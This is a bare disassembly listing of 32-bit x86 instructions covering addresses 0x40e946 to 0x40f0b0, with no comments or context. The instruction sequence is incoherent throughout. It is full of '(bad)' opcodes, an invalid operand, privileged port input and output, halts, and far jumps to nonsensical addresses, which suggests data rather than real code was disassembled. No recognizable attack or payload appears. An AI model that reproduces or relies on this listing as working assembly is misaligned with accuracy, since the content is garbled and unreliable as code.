  40e946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e947:	or     dh,ah
  40e949:	pop    ss
  40e94a:	jge    0x40e982
  40e94c:	mov    ecx,DWORD PTR [ebx]
  40e94e:	mov    bl,0xdb
  40e950:	mov    ebp,0xfb8e8f6d
  40e955:	jmp    0xd3e1:0x2c687df9
  40e95c:	sti    
  40e95d:	dec    ebx
  40e95e:	and    dl,BYTE PTR [edx+0x638fa4a9]
  40e964:	mov    al,ds:0xef9b6cc8
  40e969:	mov    ecx,0xe83b1350
  40e96e:	mov    ebx,0x4fa0a4a
  40e973:	test   al,0xe3
  40e975:	mov    eax,ds:0xd5f803ea
  40e97a:	dec    eax
  40e97b:	je     0x40e960
  40e97d:	and    al,0x79
  40e97f:	pop    eax
  40e980:	dec    esp
  40e981:	adc    edx,esp
  40e983:	mov    al,ds:0xd6a2df45
  40e988:	xchg   BYTE PTR [eax+0x2d],bh
  40e98b:	xor    cl,BYTE PTR [ecx]
  40e98d:	jp     0x40e91e
  40e98f:	xor    BYTE PTR [esi+0x30],0x29
  40e993:	sub    al,0xcb
  40e995:	test   eax,0xad5cf96c
  40e99a:	xor    al,0xa3
  40e99c:	daa    
  40e99d:	shl    DWORD PTR [ebx],1
  40e99f:	mov    al,0x6e
  40e9a1:	pop    edx
  40e9a2:	sar    BYTE PTR [edi+0x78b890e3],1
  40e9a8:	cmc    
  40e9a9:	mov    eax,ds:0x4109c515
  40e9ae:	aad    0x74
  40e9b0:	push   cs
  40e9b1:	pop    esp
  40e9b2:	cwde   
  40e9b3:	add    eax,0x1a661fe9
  40e9b8:	add    eax,eax
  40e9ba:	adc    eax,0x625d6863
  40e9bf:	cmp    bl,dh
  40e9c1:	sahf   
  40e9c2:	mov    bh,0x34
  40e9c4:	inc    ecx
  40e9c5:	sub    BYTE PTR [ebx+eiz*2+0x1687917],cl
  40e9cc:	test   eax,0x89a38896
  40e9d1:	and    edi,DWORD PTR [edi]
  40e9d3:	ss jg  0x40e95a
  40e9d6:	adc    DWORD PTR [edx+0x24],ebp
  40e9d9:	(bad)  [esi+0x3cb9dd18]
  40e9df:	push   0xc14b57ff
  40e9e4:	call   0x9372:0xb8753cbe
  40e9eb:	adc    esi,esi
  40e9ed:	mov    ebx,0x6173fe57
  40e9f2:	icebp  
  40e9f3:	mov    ch,BYTE PTR [esi+0x88ca786]
  40e9f9:	cmp    eax,0x43f835a3
  40e9fe:	ja     0x40ea29
  40ea00:	dec    eax
  40ea01:	js     0x40ea31
  40ea03:	add    ebp,DWORD PTR [esi-0x61af683b]
  40ea09:	adc    BYTE PTR [ebx+ebx*2-0x2909f22],0xbb
  40ea11:	int    0xde
  40ea13:	icebp  
  40ea14:	jnp    0x40ea3d
  40ea16:	dec    edi
  40ea17:	inc    edi
  40ea18:	cmp    dh,BYTE PTR [edx+0x37]
  40ea1b:	mov    dl,0x74
  40ea1d:	xchg   DWORD PTR [edi-0x270bbfc7],eax
  40ea23:	sbb    BYTE PTR [edx+0x7a3ca29e],0xc7
  40ea2a:	adc    edx,esi
  40ea2c:	test   BYTE PTR [edi],al
  40ea2e:	xchg   BYTE PTR [eax+0x7a],cl
  40ea31:	out    dx,eax
  40ea32:	test   BYTE PTR [eax-0x2d],bh
  40ea35:	ja     0x40ea84
  40ea37:	imul   esp,DWORD PTR [eax-0x29c635ec],0xd0dbbdb
  40ea41:	aam    0x93
  40ea43:	and    eax,DWORD PTR [ecx+0x5d7cdcdb]
  40ea49:	ins    DWORD PTR es:[edi],dx
  40ea4a:	sahf   
  40ea4b:	shl    BYTE PTR [ebx+ebx*2-0xb],0x62
  40ea50:	imul   edx,DWORD PTR [edx+0x1bc833d9],0xffffffc8
  40ea57:	mov    esi,DWORD PTR [edx]
  40ea59:	(bad)  
  40ea5a:	sbb    eax,0xd6073a63
  40ea5f:	mul    BYTE PTR [esi+0x41437eaa]
  40ea65:	popf   
  40ea66:	mov    dh,0x36
  40ea68:	push   edx
  40ea69:	in     al,0x5c
  40ea6b:	int    0xf3
  40ea6d:	push   cs
  40ea6e:	jg     0x40ea96
  40ea70:	clc    
  40ea71:	aaa    
  40ea72:	paddb  mm0,mm4
  40ea75:	mov    al,ds:0x7bae666b
  40ea7a:	jmp    0xf11e5a57
  40ea7f:	dec    edx
  40ea80:	xchg   esp,eax
  40ea81:	xchg   ebp,eax
  40ea82:	(bad)
  40ea85:	jle    0x40eaa7
  40ea87:	pop    ecx
  40ea88:	arpl   WORD PTR [ebx],bp
  40ea8a:	dec    ebx
  40ea8b:	out    0xbb,eax
  40ea8d:	inc    esp
  40ea8e:	in     eax,0xf
  40ea90:	or     eax,DWORD PTR [eax]
  40ea92:	xor    eax,0xc797990d
  40ea97:	and    al,0x71
  40ea99:	mov    eax,0x208df900
  40ea9e:	lea    ecx,ds:0x9d521e6
  40eaa4:	or     bh,dl
  40eaa6:	push   esp
  40eaa7:	mov    esi,0xe62c33bb
  40eaac:	sub    bl,BYTE PTR [ebp-0x29773954]
  40eab2:	daa    
  40eab3:	sbb    edx,0x32
  40eab6:	and    DWORD PTR [ebp+0x4726e0bb],ebx
  40eabc:	or     esp,DWORD PTR [edi-0x5b]
  40eabf:	sub    al,0xb8
  40eac1:	push   esi
  40eac2:	(bad)  
  40eac3:	retf   0x33ca
  40eac6:	or     BYTE PTR [esi+0x2a],0xbf
  40eaca:	loope  0x40eb10
  40eacc:	das    
  40eacd:	pop    esi
  40eace:	in     al,0x8
  40ead0:	pop    edx
  40ead1:	mov    BYTE PTR [eax],al
  40ead3:	scas   eax,DWORD PTR es:[edi]
  40ead4:	fst    DWORD PTR [ebx]
  40ead6:	dec    edi
  40ead7:	fcomip st,st(3)
  40ead9:	test   BYTE PTR [eax+0x13],dl
  40eadc:	rol    DWORD PTR [edi+0x43791bca],cl
  40eae2:	test   eax,0xa3f05cf6
  40eae7:	jno    0x40ea7e
  40eae9:	sub    DWORD PTR [esi+esi*1-0x62bfa650],esp
  40eaf0:	cmp    edi,eax
  40eaf2:	jg     0x40eaea
  40eaf4:	xor    dh,al
  40eaf6:	xchg   ebp,eax
  40eaf7:	clc    
  40eaf8:	ds mov ebp,0x953f9963
  40eafe:	pushf  
  40eaff:	sub    al,0x9
  40eb01:	mov    esi,0x791ee094
  40eb06:	in     al,0x44
  40eb08:	jmp    0xb47c:0xb07b27d7
  40eb0f:	and    cl,BYTE PTR [edx+ebx*2]
  40eb12:	jnp    0x40ead5
  40eb14:	and    edx,DWORD PTR [edx]
  40eb16:	xchg   esp,eax
  40eb17:	xchg   ecx,eax
  40eb18:	int3   
  40eb19:	inc    edi
  40eb1a:	clc    
  40eb1b:	aam    0xb
  40eb1d:	xor    BYTE PTR [ebx+0x493c4c4b],cl
  40eb23:	fld    DWORD PTR [ecx]
  40eb25:	xor    BYTE PTR [edx],0xa0
  40eb28:	aad    0xd7
  40eb2a:	idiv   ch
  40eb2c:	repnz pop edi
  40eb2e:	or     al,0x18
  40eb30:	xchg   esi,eax
  40eb31:	fiadd  WORD PTR [edi+ebp*2-0xdbc93c5]
  40eb38:	push   es
  40eb39:	push   0xffffffa5
  40eb3b:	jne    0x40ebb4
  40eb3d:	ja     0x40eb15
  40eb3f:	xor    esi,0x3668ec04
  40eb45:	dec    esp
  40eb46:	stos   DWORD PTR es:[edi],eax
  40eb47:	sbb    DWORD PTR [eax],ebx
  40eb49:	adc    DWORD PTR [ebx+0x191d981],esi
  40eb4f:	push   edi
  40eb50:	repnz cmp al,0xc8
  40eb53:	mov    ah,0x60
  40eb55:	outs   dx,DWORD PTR ds:[esi]
  40eb56:	iret   
  40eb57:	xlat   BYTE PTR ds:[ebx]
  40eb58:	adc    DWORD PTR [edx],edx
  40eb5a:	xlat   BYTE PTR ds:[ebx]
  40eb5b:	mov    eax,ds:0x9f6dd66e
  40eb60:	call   0xec588db7
  40eb65:	dec    eax
  40eb66:	push   ds
  40eb67:	ins    DWORD PTR es:[edi],dx
  40eb68:	jecxz  0x40eb3c
  40eb6a:	jae    0x40eafc
  40eb6c:	shl    BYTE PTR [ebx+0x57],1
  40eb6f:	sub    ah,BYTE PTR [edx]
  40eb71:	ret    0x4407
  40eb74:	inc    edx
  40eb75:	mov    al,0xed
  40eb77:	fdivrp st(2),st
  40eb79:	neg    BYTE PTR [ecx+0x9]
  40eb7c:	pop    edx
  40eb7d:	sub    al,0x10
  40eb7f:	xchg   ebx,eax
  40eb80:	scas   al,BYTE PTR es:[edi]
  40eb81:	cmp    DWORD PTR [ebp-0x3c33435],ebp
  40eb87:	add    al,0xdf
  40eb89:	push   0x3a512664
  40eb8e:	push   ss
  40eb8f:	cmp    DWORD PTR [ebp+ebp*4-0x34e6c0f4],esi
  40eb96:	sti    
  40eb97:	popf   
  40eb98:	add    DWORD PTR [ebx],ebp
  40eb9a:	mov    edi,0xef11ab13
  40eb9f:	inc    edx
  40eba0:	push   0xe6eee6b6
  40eba5:	fcmovnu st,st(7)
  40eba7:	push   esi
  40eba8:	or     dh,BYTE PTR cs:[edx+0x24]
  40ebac:	push   ebp
  40ebad:	popa   
  40ebae:	push   0x371dc77e
  40ebb3:	mov    cl,cl
  40ebb5:	out    0xf9,eax
  40ebb7:	add    bl,BYTE PTR [edi+0x11]
  40ebba:	jmp    0x404e75d3
  40ebbf:	mov    dh,0xc9
  40ebc1:	mov    esp,DWORD PTR ds:0xfb331610
  40ebc7:	mov    eax,ds:0x7520d1cb
  40ebcc:	pop    ebp
  40ebcd:	cmp    bl,BYTE PTR [eiz*2+0x6e7626bd]
  40ebd4:	pop    edi
  40ebd5:	aad    0xb5
  40ebd7:	inc    ebx
  40ebd8:	jbe    0x40ec43
  40ebda:	mov    ch,0x75
  40ebdc:	test   BYTE PTR [edi],cl
  40ebde:	inc    ecx
  40ebdf:	pop    ebx
  40ebe0:	xor    eax,0x65f77c02
  40ebe5:	cwde   
  40ebe6:	sti    
  40ebe7:	jmp    0x40ebd1
  40ebe9:	(bad)  
  40ebea:	adc    bl,ch
  40ebec:	lods   al,BYTE PTR ds:[esi]
  40ebed:	jae    0x40ec44
  40ebef:	ret    0x6261
  40ebf2:	out    dx,al
  40ebf3:	cwde   
  40ebf4:	call   0x5d0a:0x33ff15fb
  40ebfb:	mov    edx,0x49283cdc
  40ec00:	mov    ecx,0xd5ad9cbb
  40ec05:	data16 fstp QWORD PTR [edx-0x6457867f]
  40ec0c:	scas   al,BYTE PTR es:[edi]
  40ec0d:	imul   eax,edx,0x59
  40ec10:	ins    BYTE PTR es:[edi],dx
  40ec11:	repnz add edx,DWORD PTR [ebx-0x54f034b7]
  40ec18:	xchg   esi,eax
  40ec19:	stc    
  40ec1a:	add    bh,ch
  40ec1c:	add    edi,edi
  40ec1e:	(bad)  
  40ec1f:	pop    esi
  40ec20:	push   esi
  40ec21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec22:	mov    ebp,0x9f03f797
  40ec27:	imul   edi,ebx,0x19
  40ec2a:	test   BYTE PTR [ebx+ebp*1],0x71
  40ec2e:	sub    eax,0xe87fed66
  40ec33:	xchg   ecx,eax
  40ec34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec35:	lea    ebx,[edx]
  40ec37:	call   0x149dddd8
  40ec3c:	mov    eax,0x4486d585
  40ec41:	icebp  
  40ec42:	test   eax,0x4cfbec7
  40ec47:	test   DWORD PTR [ebp+0x78],ecx
  40ec4a:	fs mov dl,0x3a
  40ec4d:	loop   0x40ec61
  40ec4f:	or     al,0x0
  40ec51:	mov    ch,0x7a
  40ec53:	je     0x40ec36
  40ec55:	fnsave [edx-0xd]
  40ec58:	xor    edi,esi
  40ec5a:	pop    ebp
  40ec5b:	in     al,dx
  40ec5c:	(bad)  
  40ec5d:	repnz in eax,dx
  40ec5f:	out    dx,eax
  40ec60:	retf   
  40ec61:	jl     0x40ec32
  40ec63:	std    
  40ec64:	in     eax,dx
  40ec65:	paddq  mm7,QWORD PTR [esi+0x65df02e6]
  40ec6c:	sbb    ah,BYTE PTR [ebx]
  40ec6e:	sub    BYTE PTR [ebp-0x75],bh
  40ec71:	jp     0x40ec81
  40ec73:	out    dx,al
  40ec74:	iret   
  40ec75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec76:	jle    0x40ec57
  40ec78:	mov    bh,0xe4
  40ec7a:	mov    ebp,esi
  40ec7c:	jns    0x40ec09
  40ec7e:	mov    edi,0xe44fc28f
  40ec83:	arpl   WORD PTR [ebp-0x2],bp
  40ec86:	add    edx,ebx
  40ec88:	int    0xd
  40ec8a:	scas   eax,DWORD PTR es:[edi]
  40ec8b:	aas    
  40ec8c:	sub    al,0xc6
  40ec8e:	jmp    0xe4af:0xa60a8172
  40ec95:	lods   al,BYTE PTR ds:[esi]
  40ec96:	ret    0xce55
  40ec99:	outs   dx,DWORD PTR ds:[esi]
  40ec9a:	push   eax
  40ec9b:	mov    ebx,edx
  40ec9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec9e:	cdq    
  40ec9f:	push   ds
  40eca0:	mov    bl,ah
  40eca2:	fdiv   QWORD PTR [edx+ecx*1-0x244a6719]
  40eca9:	lahf   
  40ecaa:	dec    ebp
  40ecab:	mov    dl,0xba
  40ecad:	push   0xc
  40ecaf:	mov    eax,ds:0xa7b9aec7
  40ecb4:	test   DWORD PTR [eax+0x18],0xd6dbdaef
  40ecbb:	jge    0x40ec4d
  40ecbd:	mov    dl,0x17
  40ecbf:	mov    dl,dl
  40ecc1:	into   
  40ecc2:	aaa    
  40ecc3:	imul   ecx,DWORD PTR [esi-0x1f8c938],0xe5d67017
  40eccd:	push   esp
  40ecce:	cmp    eax,0x460348ca
  40ecd3:	push   edi
  40ecd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecd5:	lods   eax,DWORD PTR ds:[esi]
  40ecd6:	sub    ebp,DWORD PTR [esi+ebx*4+0x19]
  40ecda:	nop
  40ecdb:	jne    0x40ece1
  40ecdd:	and    BYTE PTR [esi+0x7c],dh
  40ece0:	ret    0x6039
  40ece3:	gs push 0xffffffc6
  40ece6:	sub    ebx,ecx
  40ece8:	std    
  40ece9:	mov    al,0x8c
  40eceb:	mov    cl,0x9a
  40eced:	pop    eax
  40ecee:	mov    edx,0xba9d8cea
  40ecf3:	fdivr  QWORD PTR [esi]
  40ecf5:	xchg   BYTE PTR [eax+0x4ac6825b],al
  40ecfb:	iret   
  40ecfc:	xchg   esp,eax
  40ecfd:	or     ecx,0x4033f58d
  40ed03:	or     eax,0xd3b782e6
  40ed08:	xchg   ebp,eax
  40ed09:	inc    edx
  40ed0a:	mov    WORD PTR [ebx+ecx*8],fs
  40ed0d:	dec    edi
  40ed0e:	and    edx,edx
  40ed10:	ins    BYTE PTR es:[edi],dx
  40ed11:	int3   
  40ed12:	out    dx,al
  40ed13:	inc    edx
  40ed14:	sub    al,0xd9
  40ed16:	cli    
  40ed17:	inc    bl
  40ed19:	push   edi
  40ed1a:	outs   dx,DWORD PTR ds:[esi]
  40ed1b:	repz sub DWORD PTR [edx],edx
  40ed1e:	jb     0x40ed9f
  40ed20:	loope  0x40ed80
  40ed22:	popa   
  40ed23:	sub    BYTE PTR [edi+0x60542a9f],0xac
  40ed2a:	mov    ebp,DWORD PTR [ebx]
  40ed2c:	sub    ebx,DWORD PTR [ecx]
  40ed2e:	mov    cl,0x7c
  40ed30:	push   ebp
  40ed31:	fisub  WORD PTR [edi]
  40ed33:	pop    esp
  40ed34:	add    eax,0x1f6e0c1b
  40ed39:	mov    dl,0x2b
  40ed3b:	inc    edi
  40ed3c:	lock scas al,BYTE PTR es:[edi]
  40ed3e:	pop    edi
  40ed3f:	out    dx,eax
  40ed40:	mov    dl,0x3d
  40ed42:	sbb    ch,BYTE PTR [ebp-0xb0ce1cb]
  40ed48:	ins    DWORD PTR es:[edi],dx
  40ed49:	scas   al,BYTE PTR es:[edi]
  40ed4a:	push   eax
  40ed4b:	rol    DWORD PTR gs:[esi+0x36b427af],1
  40ed52:	jmp    0xb737de1c
  40ed57:	add    DWORD PTR [edi-0x6c03a3ae],esi
  40ed5d:	out    0x63,eax
  40ed5f:	hlt    
  40ed60:	stc    
  40ed61:	aas    
  40ed62:	aaa    
  40ed63:	in     eax,0xf0
  40ed65:	xor    eax,0xfdbc9f1
  40ed6a:	into   
  40ed6b:	popa   
  40ed6c:	xchg   BYTE PTR [eax+0x77d975ab],ah
  40ed72:	mov    ch,0xff
  40ed74:	adc    ch,BYTE PTR [eax-0x3f]
  40ed77:	push   0x338d512c
  40ed7c:	add    eax,eax
  40ed7e:	jmp    0xe0c4:0xe809be17
  40ed85:	test   DWORD PTR [edx+edx*8+0x24],edi
  40ed89:	scas   al,BYTE PTR es:[edi]
  40ed8a:	sar    bl,cl
  40ed8c:	jl     0x40ed29
  40ed8e:	inc    eax
  40ed8f:	jne    0x40ed45
  40ed91:	and    al,0x23
  40ed93:	xchg   BYTE PTR [eax-0x1002672e],bl
  40ed99:	adc    ch,BYTE PTR [ecx]
  40ed9b:	adc    al,0x8d
  40ed9d:	inc    ecx
  40ed9e:	aam    0xda
  40eda0:	pop    edx
  40eda1:	ja     0x40eda3
  40eda3:	adc    al,0x34
  40eda5:	push   ss
  40eda6:	jnp    0x40edd7
  40eda8:	sar    ebp,cl
  40edaa:	add    DWORD PTR [ebx-0x36],edx
  40edad:	sbb    ch,BYTE PTR [ecx-0x10b7303]
  40edb3:	mov    dh,dl
  40edb5:	ja     0x40ede4
  40edb7:	fsub   DWORD PTR [esp+edi*4+0x6c]
  40edbb:	sub    ecx,ebp
  40edbd:	pop    eax
  40edbe:	lods   al,BYTE PTR ds:[esi]
  40edbf:	imul   edx,DWORD PTR [edx],0xffffff9c
  40edc2:	jp     0x40ed9c
  40edc4:	jns    0x40ee3b
  40edc6:	test   al,0xa9
  40edc8:	in     eax,0x7a
  40edca:	jge    0x40ed8e
  40edcc:	pop    ebp
  40edcd:	cmc    
  40edce:	xlat   BYTE PTR ds:[ebx]
  40edcf:	je     0x40ee00
  40edd1:	jge    0x40ee4b
  40edd3:	jl     0x40edbe
  40edd5:	or     eax,0x3752ac3e
  40edda:	out    0x46,al
  40eddc:	pop    esp
  40eddd:	jl     0x40ee53
  40eddf:	icebp  
  40ede0:	(bad)  
  40ede1:	data16 jb 0x40ee13
  40ede4:	mov    ch,BYTE PTR [ebp+0x5a2948f6]
  40edea:	xor    eax,0x3b8f3f33
  40edef:	call   0x9175:0xae3a71f0
  40edf6:	or     eax,0x1c6a1db6
  40edfb:	push   0xffffffa4
  40edfd:	adc    dl,dl
  40edff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee00:	sbb    eax,0x51937ce3
  40ee05:	mov    edx,0x90319f32
  40ee0a:	pushf  
  40ee0b:	mov    al,ds:0xf28a7116
  40ee10:	push   cs
  40ee11:	je     0x40edf7
  40ee13:	rol    ebx,cl
  40ee15:	adc    eax,0x7d4692dc
  40ee1a:	and    DWORD PTR [ebp+0x7a],0xaf051e8e
  40ee21:	mov    BYTE PTR [esi],bl
  40ee23:	ss inc eax
  40ee25:	push   edx
  40ee26:	fiadd  DWORD PTR [edi+0x77b0bab4]
  40ee2c:	push   esi
  40ee2d:	or     edx,DWORD PTR [esi]
  40ee2f:	mov    ds:0xf0441d6f,al
  40ee34:	leave  
  40ee35:	call   0x8ef00dc6
  40ee3a:	bound  ecx,QWORD PTR ds:0x6b61c794
  40ee40:	imul   ebx,DWORD PTR [edi],0xbd3f1c12
  40ee46:	cmp    BYTE PTR [eax],ch
  40ee48:	push   esi
  40ee49:	retf   
  40ee4a:	in     al,0x66
  40ee4c:	outs   dx,DWORD PTR ds:[esi]
  40ee4d:	ret    0xddcd
  40ee50:	sahf   
  40ee51:	pop    esi
  40ee52:	jae    0x40edef
  40ee54:	adc    eax,0xda450027
  40ee59:	cli    
  40ee5a:	shr    DWORD PTR [ebx+0x1e],1
  40ee5d:	daa    
  40ee5e:	dec    ecx
  40ee5f:	cmp    dh,BYTE PTR ds:0xff8e20e2
  40ee65:	lds    ebx,FWORD PTR [eax+0x2d]
  40ee68:	jne    0x40ee96
  40ee6a:	push   edi
  40ee6b:	cli    
  40ee6c:	enter  0x9d3d,0x23
  40ee70:	sub    al,0x3f
  40ee72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee73:	fidivr DWORD PTR [ecx]
  40ee75:	rol    BYTE PTR [eax-0xb1570be],0x91
  40ee7c:	hlt    
  40ee7d:	in     eax,dx
  40ee7e:	xchg   esi,eax
  40ee7f:	lods   al,BYTE PTR ds:[esi]
  40ee80:	leave  
  40ee81:	sub    DWORD PTR [ecx+0x78],edi
  40ee84:	mov    eax,es:0x30ee518e
  40ee8a:	sub    DWORD PTR [ecx+0x64],eax
  40ee8d:	push   es
  40ee8e:	xchg   ebp,eax
  40ee8f:	in     eax,0x5f
  40ee91:	fsubr  QWORD PTR [ebp+0x281bcbbf]
  40ee97:	stos   BYTE PTR es:[edi],al
  40ee98:	jo     0x40eeaf
  40ee9a:	jb     0x40ee54
  40ee9c:	sub    DWORD PTR [esi],edx
  40ee9e:	loop   0x40ee79
  40eea0:	mov    bl,0x86
  40eea2:	mov    edi,0x99845862
  40eea7:	mov    dh,0x88
  40eea9:	jmp    0x40ee5a
  40eeab:	fisttp DWORD PTR [edi-0x7f]
  40eeae:	(bad)  
  40eeaf:	pop    ecx
  40eeb0:	ja     0x40ef0c
  40eeb2:	mov    eax,fs
  40eeb4:	or     BYTE PTR [ebp+ebp*1-0x7c],bh
  40eeb8:	out    0xb2,al
  40eeba:	lea    edi,[ebp+edi*8+0x59c7d03c]
  40eec1:	mov    dh,0xd0
  40eec3:	add    DWORD PTR [ecx-0x5a],0x4b4b4f0e
  40eeca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eecb:	mov    ebp,0x70f2399b
  40eed0:	sahf   
  40eed1:	ins    BYTE PTR es:[edi],dx
  40eed2:	hlt    
  40eed3:	lock cs and eax,0xdff73727
  40eeda:	lahf   
  40eedb:	xchg   esi,eax
  40eedc:	fwait
  40eedd:	jle    0x40eef0
  40eedf:	push   ds
  40eee0:	pop    DWORD PTR [ebx]
  40eee2:	lods   eax,DWORD PTR ds:[esi]
  40eee3:	jae    0x40eee4
  40eee5:	inc    edi
  40eee6:	jl     0x40eef5
  40eee8:	std    
  40eee9:	cmp    esi,DWORD PTR [ecx-0x5]
  40eeec:	lahf   
  40eeed:	scas   eax,DWORD PTR es:[edi]
  40eeee:	mov    edi,DWORD PTR [ebx]
  40eef0:	mov    bh,0xa6
  40eef2:	mov    dl,0xd1
  40eef4:	int3   
  40eef5:	jge    0x40ef29
  40eef7:	in     al,dx
  40eef8:	jbe    0x40eedd
  40eefa:	imul   ecx,ebx,0x3f2e5c59
  40ef00:	xchg   edx,eax
  40ef01:	inc    ecx
  40ef02:	mov    edi,0x8036b411
  40ef07:	or     eax,0xa45a0cd1
  40ef0c:	in     al,dx
  40ef0d:	mov    ?,edx
  40ef0f:	(bad)  
  40ef10:	mov    WORD PTR [ecx+0x1e2e0a15],es
  40ef16:	mov    ecx,0x74f97639
  40ef1b:	jne    0x40eeb7
  40ef1d:	sub    ebp,DWORD PTR [ecx]
  40ef1f:	(bad)  
  40ef20:	sahf   
  40ef21:	fsubr  QWORD PTR [ebp+0x30]
  40ef24:	dec    eax
  40ef25:	mov    ch,0x43
  40ef27:	jge    0x40ef24
  40ef29:	sbb    al,0x42
  40ef2b:	xlat   BYTE PTR ds:[ebx]
  40ef2c:	cmp    BYTE PTR [edi+0x564e54b9],ah
  40ef32:	mov    eax,0x912a1f3e
  40ef37:	jl     0x40ef72
  40ef39:	or     eax,0x4b783e06
  40ef3e:	jmp    0xff02:0x35d21505
  40ef45:	cld    
  40ef46:	sbb    ebx,ebx
  40ef48:	or     BYTE PTR [esi+0x3a],0xef
  40ef4c:	inc    esp
  40ef4d:	mov    DWORD PTR [ebp+ecx*1+0x6c],edx
  40ef51:	ds aas 
  40ef53:	leave  
  40ef54:	adc    esi,DWORD PTR ds:0x4e58cd7
  40ef5a:	xor    al,0x83
  40ef5c:	push   ss
  40ef5d:	jo     0x40ef75
  40ef5f:	dec    ebx
  40ef60:	jecxz  0x40ef56
  40ef62:	add    eax,0xb4c20dff
  40ef67:	jle    0x40ef6c
  40ef69:	xchg   edi,eax
  40ef6a:	lods   al,BYTE PTR ds:[esi]
  40ef6b:	pop    ds
  40ef6c:	xchg   DWORD PTR [ebp-0x72bb0ee7],ecx
  40ef72:	xchg   bl,al
  40ef74:	popa   
  40ef75:	pop    ebp
  40ef76:	aad    0x6e
  40ef78:	dec    ebp
  40ef79:	int    0xbb
  40ef7b:	test   al,0x4
  40ef7d:	call   0x6c47d9e1
  40ef82:	push   edi
  40ef83:	cli    
  40ef84:	std    
  40ef85:	mov    esi,0x88b0fa92
  40ef8a:	(bad)  
  40ef8b:	mov    ah,0xa5
  40ef8d:	aas    
  40ef8e:	push   0xf2b0d5fd
  40ef93:	or     eax,eax
  40ef95:	add    esp,DWORD PTR [edx]
  40ef97:	pop    eax
  40ef98:	ins    BYTE PTR es:[edi],dx
  40ef99:	repz sbb al,0x3d
  40ef9c:	mov    bl,0x42
  40ef9e:	cli    
  40ef9f:	scas   eax,DWORD PTR es:[edi]
  40efa0:	mov    cl,0x70
  40efa2:	add    eax,DWORD PTR [ebp+0x3f]
  40efa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efa6:	pop    ebp
  40efa7:	rcr    edx,1
  40efa9:	iret   
  40efaa:	pop    esi
  40efab:	xlat   BYTE PTR ds:[ebx]
  40efac:	push   ecx
  40efad:	outs   dx,BYTE PTR ds:[esi]
  40efae:	mov    eax,0xf7c69ee0
  40efb3:	adc    DWORD PTR [eax+0xf],ebx
  40efb6:	pop    esi
  40efb7:	push   ebx
  40efb8:	sbb    al,0xa4
  40efba:	mov    gs,ebx
  40efbc:	stos   BYTE PTR es:[edi],al
  40efbd:	xor    BYTE PTR [ecx-0x67f97300],dl
  40efc3:	in     eax,dx
  40efc4:	fcomp  st(3)
  40efc6:	outs   dx,DWORD PTR ds:[esi]
  40efc7:	pop    ebx
  40efc8:	ds fcomip st,st(7)
  40efcb:	pop    edx
  40efcc:	in     eax,0xaf
  40efce:	std    
  40efcf:	mov    eax,0x209ecc40
  40efd4:	dec    ebx
  40efd5:	cld    
  40efd6:	push   ebp
  40efd7:	daa    
  40efd8:	cdq    
  40efd9:	into   
  40efda:	test   DWORD PTR [ebx+0x306f4b0a],edx
  40efe0:	ss (bad) 
  40efe2:	sti    
  40efe3:	mov    al,0x3e
  40efe5:	cwd    
  40efe7:	xor    BYTE PTR [ebx],bh
  40efe9:	push   eax
  40efeb:	fidiv  WORD PTR [esi]
  40efed:	imul   esi,DWORD PTR [edx+edx*8+0x6b5bfc17],0x96ce38c3
  40eff8:	arpl   WORD PTR [ebp-0x29],ax
  40effb:	xchg   esp,eax
  40effc:	cmp    eax,DWORD PTR [edx+esi*4+0x22]
  40f000:	jb     0x40efd3
  40f002:	jge    0x40eff2
  40f004:	mov    bh,0x51
  40f006:	stc    
  40f007:	add    eax,0x4c6cbd1b
  40f00c:	cmp    eax,0xe84fbf87
  40f011:	jo     0x40efde
  40f013:	fs je  0x40f032
  40f016:	jae    0x40efab
  40f018:	out    dx,al
  40f019:	sbb    ebp,DWORD PTR [edx]
  40f01b:	jns    0x40efcd
  40f01d:	in     eax,dx
  40f01e:	das    
  40f01f:	mov    ah,0x20
  40f021:	jle    0x40f03a
  40f023:	jb     0x40f002
  40f025:	loope  0x40efdc
  40f027:	aas    
  40f028:	pop    esi
  40f029:	sbb    ch,BYTE PTR ds:0xa484b230
  40f02f:	xchg   edx,eax
  40f030:	pop    ecx
  40f031:	stos   BYTE PTR es:[edi],al
  40f032:	mov    esi,0xd97eac46
  40f037:	lds    esi,FWORD PTR [esi]
  40f039:	xor    bl,BYTE PTR [edi-0x47a36056]
  40f03f:	pop    ecx
  40f040:	sbb    edx,DWORD PTR [eax-0x25893f6c]
  40f046:	push   esp
  40f047:	jge    0x40f0ac
  40f049:	jae    0x40f057
  40f04b:	in     al,dx
  40f04c:	and    DWORD PTR [ecx+ebp*1],ecx
  40f04f:	shl    DWORD PTR [ebx+0x1d],cl
  40f052:	jmp    0xefb36cf6
  40f057:	popa   
  40f058:	inc    eax
  40f059:	pop    ebp
  40f05a:	daa    
  40f05b:	xor    al,0x2d
  40f05d:	xor    BYTE PTR [ebx],al
  40f05f:	mov    ds:0x459a892f,al
  40f064:	push   es
  40f065:	nop
  40f066:	mov    esi,0x9171d81f
  40f06b:	mov    edx,0x3c8197e1
  40f070:	jne    0x40f034
  40f072:	fistp  DWORD PTR ds:0xf6047dd3
  40f078:	dec    ebp
  40f079:	rol    BYTE PTR [esi],0xc7
  40f07c:	out    0xe6,eax
  40f07e:	xor    DWORD PTR [edi-0x4a01f1ea],edi
  40f084:	and    eax,0x60f376fa
  40f089:	mov    ebp,0x3eff5379
  40f08e:	sbb    eax,0x89ec5773
  40f093:	xchg   ebx,eax
  40f094:	nop
  40f095:	shl    al,0xda
  40f098:	mov    dl,0xbc
  40f09a:	pop    esi
  40f09b:	aas    
  40f09c:	(bad)  
  40f09d:	arpl   si,di
  40f09f:	cmp    ebp,DWORD PTR [eax]
  40f0a1:	fld    TBYTE PTR [edi]
  40f0a3:	lods   eax,DWORD PTR ds:[esi]
  40f0a4:	pop    esi
  40f0a5:	in     eax,dx
  40f0a6:	rol    DWORD PTR [ecx],cl
  40f0a8:	inc    ebp
  40f0a9:	mov    al,0xe1
  40f0ab:	jmp    0x97108900
  40f0b0:	inc    ebp
